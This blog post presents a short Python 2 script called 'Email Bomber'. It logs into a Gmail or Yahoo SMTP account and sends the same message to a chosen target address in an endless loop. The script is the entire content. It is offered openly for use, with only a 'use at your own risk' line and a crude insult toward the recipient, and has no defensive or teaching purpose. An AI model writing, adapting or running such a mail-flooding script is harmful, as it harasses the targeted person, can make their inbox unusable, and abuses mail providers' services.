---
layout: post
title: Email Bomber
description: An email spammer script written in python.
keywords: software build automation, send email notification, using smtp client in powershell, software build notification
tags: [Python]
comments: true
---


> Use at your own risk.

**EmailBomber.py**

```python
 
 
import smtplib as s
import sys 
import string 
 
 
print"""
Welcome to Email bomber v.1 
send a range of email to your target 
 
"""
print (""" Mail server:
1.smtp.gmail.com:587
2.smtp.mail.yahoo.com:587
""")
 
 
 
mail_server= raw_input("write the mail server:")
username = raw_input("Email Username: ")
password = raw_input("Email Password: ")
 
# connection to the server
 
obj = s.SMTP(mail_server)
obj.starttls()
obj.login(username, password)
 
 
 
 
target = raw_input("target's Email: ")
message = raw_input("Message: ")
email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
 %  (username, "" .join(target), "" .join(message)))
print  "[spaming ]" + target.center(40)+ message.center(40) 
 
while 1:
    obj.sendmail(username, target, email_message)
    print "Bombing... this M***ker"
```

Happy scripting!
